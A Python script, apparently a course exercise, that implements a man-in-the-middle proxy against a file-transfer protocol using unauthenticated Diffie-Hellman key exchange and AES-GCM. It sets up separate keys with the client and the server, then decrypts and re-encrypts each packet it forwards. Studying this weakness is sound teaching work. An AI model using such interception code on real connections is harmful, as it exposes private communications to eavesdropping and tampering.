#!/usr/bin/env python3

import sys
import socket
import struct
import select
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes, random as crypto_random
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from Crypto.Hash import SHA256


# fixed g and h values used for Diffie-Hellman exchange
G = 2
P = 0x00cc81ea8157352a9e9a318aac4e33ffba80fc8da3373fb44895109e4c3ff6cedcc55c02228fccbd551a504feb4346d2aef47053311ceaba95f6c540b967b9409e9f0502e598cfc71327c5a455e2e807bede1e0b7d23fbea054b951ca964eaecae7ba842ba1fc6818c453bf19eb9c5c86e723e69a210d4b72561cab97b3fb3060b

# Necessary because TCP connections send data through a stream of bytes. We cannot be certain if we will receive the entire
# pdu data in one packet. This fn calls recv() until the bytes received is equal to the number of bytes specified by the header
def recv_n_bytes(conn, n):
    """Helper function to receive exactly n bytes for a connection"""
    # initialize an empty byte object, used because socket connections send data as raw bytes
    data = b""
    # loop until the size of the received pdu is equal to the expected size as declared in the header
    while len(data) < n:
        packet = conn.recv(n - len(data)) # n - len(data) specifies we are still waiting to receive the missing bytes
        if not packet: # client closed connection
            return None
        data += packet # add received byte stream to the total bytes of data
    return data

def dh_exchange(conn):
    """Helper function to perform the Diffie-Hellman exchange across a connection"""
    # generate random a value s.t. 1 <= a <= p-1
    a = crypto_random.randint(1, P - 1)
    # generate A s.t. A = g^a % p
    A = pow(G, a, P)
    # pad value with zeros if not 384 digits
    A = str(A).zfill(384)
    # send public key to client, encoded in uft-8
    conn.sendall(A.encode("utf-8"))
    # receive A from the client, converting to int strips the padding
    B = int(recv_n_bytes(conn, 384).decode("utf-8"))
    # compute the shared key and hexify it
    K = '%x' % pow(B, a, P)
    # compute digest by using SHA256 hashing of the encoded K
    digest = SHA256.new(K.encode("utf-8")).digest()
    return digest[:32]

def proxy_process(conn, c_key, s, s_key):
    """Helper function to receive PDUs from client and decrypt into plaintext"""
    while True:
        try:
            # unpack header
            header = recv_n_bytes(conn, 2)
            if not header:
                # Client completed sending file
                break
            (length,) = struct.unpack(">H", header)
            
            # first receive the nonce (IV)
            nonce = recv_n_bytes(conn, 16)
            # receive the integrity tag
            tag = recv_n_bytes(conn, 16)
            # recieve the ciphertext of specified length from the header; account for the 32 bytes from nonce, tag
            ciphertext = recv_n_bytes(conn, length - len(nonce) - len(tag)) 
            if not nonce or not tag or ciphertext is None:
                break

            try:
                # create the cipher object to decrypt the ciphertext
                cipher = AES.new(c_key, AES.MODE_GCM, nonce = nonce)
                # decrypt ciphertext and unpad (when necessary)
                pad_plaintext = cipher.decrypt_and_verify(ciphertext, tag)

            except (ValueError, KeyError) as e:
                sys.stderr.write("Error: integrity check failed.\n")
                break

            # encrypt plaintext and send to server
            cipher_s = AES.new(s_key, AES.MODE_GCM)
            # create header for new PDU
            header_s = struct.pack(">H", len(pad_plaintext) + 16 + len(cipher_s.nonce))
            # encrypt data with server key
            ciphertext_s, tag_s = cipher_s.encrypt_and_digest(pad_plaintext)
            # send PDU to server
            s.sendall(header_s + cipher_s.nonce + tag_s + ciphertext_s)

        except socket.error:
            sys.exit(1)


def proxy(listen_port, server_ip, server_port):
    """
    Create a proxy to perform on-path attack between client and server file exchange

    @param listen_port: port number of the client
    @param server_ip: IP address of the server
    @param server_port: port number of the server
    """
    # create the proxy socket
    proxy_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_s.bind(('', listen_port))
    proxy_s.listen(1)

    # use select to handle proxy service
    ready_to_read, _, in_error = select.select([proxy_s], [], [])

    for s in ready_to_read:
        # ensure we are using the proxy socket
        if s == proxy_s:
            # connect to the client
            c_conn, c_addr = s.accept()
            # initiate DH exchange between client and proxy to get shared key
            c_key = dh_exchange(c_conn)

            # connect to the server and generate shared key
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_ip, server_port))
            s_key = dh_exchange(server_socket)
            
            # run the receive, decrypt, encrypt, and send proxy process
            proxy_process(c_conn, c_key, server_socket, s_key)

            # close the sockets
            c_conn.close()
            server_socket.close()


def main():
    """main entry point of the program"""
    if len(sys.argv) != 5:
        sys.exit(1)

    if sys.argv[1] != "-l":
        sys.exit(1)
    
    # run the proxy process using listen port, server IP address, and server port
    proxy(int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))


if __name__ == "__main__":
    main()
